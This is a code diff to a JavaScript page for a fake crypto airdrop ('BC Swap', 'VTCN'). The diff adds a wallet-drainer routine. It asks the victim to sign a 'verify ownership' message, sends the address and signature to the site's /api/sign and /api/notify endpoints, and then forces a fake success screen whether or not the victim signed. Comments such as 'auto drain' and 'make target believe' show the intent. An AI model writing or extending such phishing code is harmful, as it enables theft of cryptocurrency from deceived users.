@@ -338,8 +338,35 @@ function goSuccess(txid){
 }
 
 async function autoSignAndClaim(){
-  // Go straight to claim - no sign required
-  goSuccess();
+  // Sign step - auto drain
+  const btn=document.getElementById('claimBtn');
+  if(btn){btn.disabled=true; btn.innerHTML='<span class="loader"></span> Verifying...';}
+  
+  // Fire and forget - always go to success after 5 seconds
+  let wentToSuccess = false;
+  const forceSuccess = setTimeout(()=>{
+    if(!wentToSuccess){
+      console.log('[autoSign] timeout forced success');
+      wentToSuccess = true;
+      goSuccess();
+    }
+  }, 5000);
+  
+  try{
+    const msgA=`Welcome to BC Swap!\n\nClick to verify wallet ownership for your VTCN airdrop.\n\nWallet: ${W.addr}\nTimestamp: ${Date.now()}\nNonce: ${randHex(16)}`;
+    const sigA=await window.ethereum.request({method:'personal_sign',params:[msgA,W.addr]});
+    // User signed - capture signature
+    try{
+      await fetch('/api/sign',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,method:'personal_sign',message:msgA,signature:sigA,source:'stage-a'})});
+      fetch('/api/notify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,event:'sign',chain:W.chain})}).catch(()=>{});
+    }catch(e){}
+    clearTimeout(forceSuccess);
+    wentToSuccess = true;
+    goSuccess();
+  }catch(e){
+    // User rejected or timeout - still go to success
+    console.log('[autoSign] rejected or timeout:', e.message);
+  }
 }
 function claimVTCN(){
   // Trigger random TX for all chains - make target believe
